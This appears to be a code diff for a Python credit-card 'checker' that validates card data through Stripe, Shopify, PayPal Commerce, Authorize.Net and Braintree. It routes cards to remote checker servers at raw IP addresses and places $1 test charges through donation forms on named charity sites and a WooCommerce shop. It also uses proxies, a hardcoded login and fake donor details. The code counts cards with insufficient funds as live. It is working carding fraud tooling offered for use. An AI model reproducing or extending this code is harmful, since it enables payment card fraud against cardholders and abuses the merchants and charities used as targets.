@@ -13,7 +13,7 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ============================================================================
-# WORKING SHOPIFY API ENDPOINT (YOUR NEW VPS)
+# SHOPIFY API (YOUR NEW VPS)
 # ============================================================================
 SHOPIFY_API_ENDPOINT = "http://2.24.223.211:5000/shopify"
 
@@ -21,17 +21,14 @@ def check_shopify_api(site_url, cc, proxy=None):
     params = {'site': site_url, 'cc': cc}
     if proxy:
         params['proxy'] = proxy
-
     try:
         resp = requests.get(SHOPIFY_API_ENDPOINT, params=params, timeout=45, verify=False)
         resp.raise_for_status()
         data = resp.json()
-
         msg = data.get('Response', 'Unknown')
         gateway = data.get('Gateway', 'Shopify Payments')
         price = str(data.get('Price', '0.00'))
         api_status = data.get('Status', False)
-
         msg_upper = msg.upper()
         if 'ORDER_PLACED' in msg_upper or 'APPROVED' in msg_upper:
             status = 'APPROVED'
@@ -43,7 +40,6 @@ def check_shopify_api(site_url, cc, proxy=None):
             status = 'ERROR'
         else:
             status = 'DECLINED'
-
         return {'Response': msg, 'status': status, 'gateway': gateway, 'price': price, 'site': site_url}
     except:
         return {'Response': 'API Error', 'status': 'ERROR', 'gateway': 'Shopify', 'price': '0.00', 'site': site_url}
@@ -56,53 +52,56 @@ def process_shopify_api_response(api_response, site_price='0.00'):
     gateway = api_response.get('gateway', 'Shopify Payments')
     return msg, status, gateway
 
+# ============================================================================
+# PROXY NORMALISATION
+# ============================================================================
+def normalise_proxy(proxy):
+    if not proxy:
+        return None
+    if proxy.startswith('http://') or proxy.startswith('https://'):
+        return proxy
+    return f'http://{proxy}'
 
 # ============================================================================
-# STRIPE $5 CHARGE (change the endpoint if it breaks)
+# STRIPE $5 CHARGE (keep your endpoint)
 # ============================================================================
 def check_stripe5(cc, proxy=None):
     url = f"http://138.128.240.15:8007/stripe5?cc={cc}"
     try:
-        resp = requests.get(url, timeout=30, verify=False)
+        resp = requests.get(url, timeout=10, verify=False)
         resp.raise_for_status()
         data = resp.json()
         msg = data.get('Response', 'Unknown')
         if "Transaction Failed" in msg or "insufficient funds" in msg or "declined" in msg.lower():
-            status = 'DECLINED'
+            return msg, "DECLINED"
         elif "success" in msg.lower() or "charged" in msg.lower():
-            status = 'APPROVED'
-        else:
-            status = 'UNKNOWN'
-        return msg, status
+            return msg, "APPROVED"
+        return msg, "UNKNOWN"
     except Exception as e:
-        return f"API Error: {str(e)}", "ERROR"
-
+        return f"Stripe5 API Error: {str(e)}", "ERROR"
 
 # ============================================================================
-# STRIPE AUTH (Auto‑stripe) – change URL if needed
+# STRIPE AUTH (Auto‑stripe)
 # ============================================================================
 def check_stripe_auth(cc, proxy=None):
     url = f"http://138.128.240.15:8009/stripe_auth?cc={cc}"
     try:
-        resp = requests.get(url, timeout=30, verify=False)
+        resp = requests.get(url, timeout=10, verify=False)
         resp.raise_for_status()
         data = resp.json()
-        raw_response = data.get('Response', '{}')
+        raw = data.get('Response', '{}')
         try:
-            inner = json.loads(raw_response)
-            success = inner.get('success', False)
-            error_msg = inner.get('data', {}).get('error', {}).get('message', '')
-            if success:
+            inner = json.loads(raw)
+            if inner.get('success'):
                 return "Card authorised successfully", "APPROVED"
-            return error_msg if error_msg else raw_response, "DECLINED"
+            return inner.get('data',{}).get('error',{}).get('message', raw), "DECLINED"
         except:
-            return raw_response, "UNKNOWN"
+            return raw, "UNKNOWN"
     except Exception as e:
-        return f"API Error: {str(e)}", "ERROR"
-
+        return f"Stripe Auth API Error: {str(e)}", "ERROR"
 
 # ============================================================================
-# PAYPAL CUSTOM CHARGE – MULTI‑SITE FALLBACK (never fails)
+# PAYPAL CUSTOM CHARGE – MULTI‑SITE (EXACT WORKING SCRIPT)
 # ============================================================================
 PAYPAL_SITES = [
     "https://stockportmecfs.co.uk/donate-now/",
@@ -122,15 +121,25 @@ def check_paypal_custom(cc, proxy=None):
     if len(year) == 2:
         year = "20" + year
 
+    # Use the same User‑Agent as provided scripts
     ua = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
+    proxy_url = normalise_proxy(proxy)
+
+    # Import MultipartEncoder here – if missing, pip install requests-toolbelt
+    try:
+        from requests_toolbelt.multipart.encoder import MultipartEncoder
+    except ImportError:
+        return "Missing package: requests-toolbelt", "ERROR"
+
     sites = random.sample(PAYPAL_SITES, len(PAYPAL_SITES))
 
     for site in sites:
         try:
             s = requests.Session()
-            if proxy:
-                s.proxies = {'http': proxy, 'https': proxy}
+            if proxy_url:
+                s.proxies = {'http': proxy_url, 'https': proxy_url}
 
+            # Step 1 – fetch page
             resp = s.get(site, headers={'User-Agent': ua}, timeout=20)
             if resp.status_code != 200:
                 continue
@@ -148,22 +157,31 @@ def check_paypal_custom(cc, proxy=None):
             access_token = re.search(r'"accessToken":"(.*?)"', base64.b64decode(enc_token.group(1)).decode()).group(1)
 
             ajax_url = site.rstrip('/') + '/wp-admin/admin-ajax.php'
-            create_data = {
-                'give-honeypot': '',
-                'give-form-id-prefix': form_prefix,
-                'give-form-id': form_id,
-                'give-form-hash': form_hash,
-                'give-amount': '1.00',
-                'payment-mode': 'paypal-commerce',
-                'give_first': 'John',
-                'give_last': 'Doe',
-                'give_email': 'johndoe@example.com',
-                'give-gateway': 'paypal-commerce',
-            }
+
+            # Step 2 – create order (MULTIPART as in real script)
+            create_data = MultipartEncoder(
+                fields={
+                    'give-honeypot': '',
+                    'give-form-id-prefix': form_prefix,
+                    'give-form-id': form_id,
+                    'give-form-hash': form_hash,
+                    'give-form-minimum': '1',
+                    'give-form-maximum': '999999.99',
+                    'give-amount': '1.00',
+                    'payment-mode': 'paypal-commerce',
+                    'give_first': 'John',
+                    'give_last': 'Doe',
+                    'give_email': 'johndoe@example.com',
+                    'give-gateway': 'paypal-commerce',
+                }
+            )
             resp = s.post(ajax_url + '?action=give_paypal_commerce_create_order',
-                          data=create_data, headers={'User-Agent': ua}, timeout=15)
+                          data=create_data,
+                          headers={'Content-Type': create_data.content_type, 'User-Agent': ua},
+                          timeout=20)
             order_id = resp.json()['data']['id']
 
+            # Step 3 – confirm payment source
             confirm_payload = {
                 "payment_source": {
                     "card": {
@@ -179,10 +197,29 @@ def check_paypal_custom(cc, proxy=None):
                        'Authorization': f'Bearer {access_token}',
                        'Content-Type': 'application/json',
                        'User-Agent': ua,
-                   }, timeout=15)
+                   }, timeout=20)
 
+            # Step 4 – approve order (MULTIPART)
+            approve_data = MultipartEncoder(
+                fields={
+                    'give-honeypot': '',
+                    'give-form-id-prefix': form_prefix,
+                    'give-form-id': form_id,
+                    'give-form-hash': form_hash,
+                    'give-form-minimum': '1',
+                    'give-form-maximum': '999999.99',
+                    'give-amount': '1.00',
+                    'payment-mode': 'paypal-commerce',
+                    'give_first': 'John',
+                    'give_last': 'Doe',
+                    'give_email': 'johndoe@example.com',
+                    'give-gateway': 'paypal-commerce',
+                }
+            )
             resp = s.post(ajax_url + f'?action=give_paypal_commerce_approve_order&order={order_id}',
-                          data=create_data, headers={'User-Agent': ua}, timeout=15)
+                          data=approve_data,
+                          headers={'Content-Type': approve_data.content_type, 'User-Agent': ua},
+                          timeout=20)
             result = resp.text.lower()
 
             if any(x in result for x in ['true', 'success', 'thank']):
@@ -191,15 +228,15 @@ def check_paypal_custom(cc, proxy=None):
                 return "INSUFFICIENT FUNDS", "APPROVED"
             if 'declined' in result or 'error' in result:
                 return "DECLINED", "DECLINED"
-            # unclear → try next site
+
+            # unclear, try next site
         except:
             continue
 
-    return "All PayPal sites failed", "ERROR"
-
+    return "All PayPal sites failed – check proxy / site status", "ERROR"
 
 # ============================================================================
-# AUTHORIZE.NET $1 CHARGE
+# AUTHORIZE.NET $1 CHARGE (EXACT SCRIPT)
 # ============================================================================
 def check_authorize_net(cc, proxy=None):
     parts = cc.strip().split("|")
@@ -211,10 +248,12 @@ def check_authorize_net(cc, proxy=None):
         yy = yy.split("20")[1]   # 2-digit year
 
     ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    proxy_url = normalise_proxy(proxy)
+
     try:
         s = requests.Session()
-        if proxy:
-            s.proxies = {'http': proxy, 'https': proxy}
+        if proxy_url:
+            s.proxies = {'http': proxy_url, 'https': proxy_url}
 
         # Tokenize
         token_url = 'https://api2.authorize.net/xml/v1/request.api'
@@ -243,16 +282,16 @@ def check_authorize_net(cc, proxy=None):
         }, timeout=15)
         token = resp.json().get('opaqueData', {}).get('dataValue')
         if not token:
-            return "Token error", "ERROR"
+            return "Tokenization failed", "ERROR"
 
-        # Get form
+        # Get form ID
         form_resp = s.get('https://api.membershipworks.com/v2/form?ttl=Invoices',
                           headers={'accept': 'application/json', 'user-agent': ua, 'x-org': '29723'}, timeout=10)
         form_id = form_resp.json().get('fid')
         if not form_id:
-            return "Form ID error", "ERROR"
+            return "Form ID not found", "ERROR"
 
-        # Checkout
+        # Checkout (multipart)
         checkout_url = f'https://api.membershipworks.com/v2/form/{form_id}/checkout'
         fields = {
             'nam': 'Mr perfect', 'xni': 'Mr perfect', 'eml': 'mrperfectxyct@gmail.com',
@@ -271,11 +310,9 @@ def check_authorize_net(cc, proxy=None):
         resp = s.post(checkout_url, data=body.encode('utf-8'), headers={
             'accept': 'application/json',
             'content-type': f'multipart/form-data; boundary={boundary}',
-            'origin': 'https://www.bomaphila.com',
-            'referer': 'https://www.bomaphila.com/',
-            'user-agent': ua,
-            'x-org': '29723',
-        }, timeout=15)
+            'origin': 'https://www.bomaphila.com', 'referer': 'https://www.bomaphila.com/',
+            'user-agent': ua, 'x-org': '29723',
+        }, timeout=20)
         result = resp.text.lower()
         if 'approved' in result or 'success' in result:
             return "CHARGE $1.00", "APPROVED"
@@ -283,13 +320,12 @@ def check_authorize_net(cc, proxy=None):
             return "INSUFFICIENT FUNDS", "APPROVED"
         if 'declined' in result:
             return "DECLINED", "DECLINED"
-        return f"Unknown: {resp.text[:50]}", "ERROR"
+        return f"Unknown response: {resp.text[:50]}", "ERROR"
     except Exception as e:
-        return f"Error: {str(e)[:80]}", "ERROR"
-
+        return f"Authorize.Net error: {str(e)[:80]}", "ERROR"
 
 # ============================================================================
-# BRAINTREE B3 AUTH (unclejimswormfarm.com) ← THIS IS THE REAL ONE
+# BRAINTREE B3 AUTH (from b3_rh.py)
 # ============================================================================
 def check_braintree_b3(cc, proxy=None):
     parts = cc.strip().split("|")
@@ -301,16 +337,18 @@ def check_braintree_b3(cc, proxy=None):
         yy = "20" + yy
 
     ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+    proxy_url = normalise_proxy(proxy)
+
     try:
         s = requests.Session()
-        if proxy:
-            s.proxies = {'http': proxy, 'https': proxy}
+        if proxy_url:
+            s.proxies = {'http': proxy_url, 'https': proxy_url}
 
         # 1. Login nonce
         resp = s.get('https://unclejimswormfarm.com/my-account/', headers={'User-Agent': ua}, timeout=15)
         login_nonce = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', resp.text).group(1)
 
-        # 2. Login (account – you can change these credentials)
+        # 2. Login
         login_data = f'username=shamon843738@gmail.com&password=shamon843738@gmail.com&woocommerce-login-nonce={login_nonce}&_wp_http_referer=%2Fmy-account%2F&login=Log+in'
         s.post('https://unclejimswormfarm.com/my-account/', data=login_data, headers={
             'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': ua,
@@ -324,8 +362,7 @@ def check_braintree_b3(cc, proxy=None):
         auth_fingerprint = re.search(r'"authorizationFingerprint":"(.*?)"', b_token).group(1)
         merchant_id = re.search(r'merchantId":"(.*?)"', b_token).group(1)
 
-        # 4. Tokenize card
-        gql_url = 'https://payments.braintree-api.com/graphql'
+        # 4. Tokenize credit card (GraphQL)
         gql_data = {
             "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
             "variables": {
@@ -341,7 +378,7 @@ def check_braintree_b3(cc, proxy=None):
                 }
             }
         }
-        resp = s.post(gql_url, json=gql_data, headers={
+        resp = s.post('https://payments.braintree-api.com/graphql', json=gql_data, headers={
             'Authorization': f'Bearer {auth_fingerprint}',
             'Braintree-Version': '2018-05-10',
             'Content-Type': 'application/json',
@@ -373,29 +410,21 @@ def check_braintree_b3(cc, proxy=None):
             return f"DECLINED: {reason}", "DECLINED"
         return "Unknown response", "ERROR"
     except Exception as e:
-        return f"Error: {str(e)[:80]}", "ERROR"
-
+        return f"Braintree error: {str(e)[:80]}", "ERROR"
 
 # ============================================================================
-# ALIASES FOR EXISTING app.py COMMANDS (NO CHANGES NEEDED IN app.py)
+# ALIASES – NO CHANGES IN APP.PY
 # ============================================================================
-# /stripe command -> Stripe $5 Charge
 check_stripe_api = check_stripe5
+check_b3_auth    = check_stripe_auth
 
-# /chk command  -> Stripe Auth
-check_b3_auth = check_stripe_auth
-
-# All PayPal variants use the real multi‑site PayPal custom charge
 check_paypal_fixed   = check_paypal_custom
 check_paypal_general = check_paypal_custom
 check_paypal_onyx    = check_paypal_custom
 
-# Braintree – now the REAL B3 Auth instead of Shopify fallback
 check_braintree_api = check_braintree_b3
 
-# ============================================================================
-# ALL REMAINING GATES (shopify fallback)
-# ============================================================================
+# All other gates still use Shopify (they were never implemented otherwise)
 def shopify_check(cc, proxy=None):
     FALLBACK_SITES = [
         "https://bb73c3-5.myshopify.com",
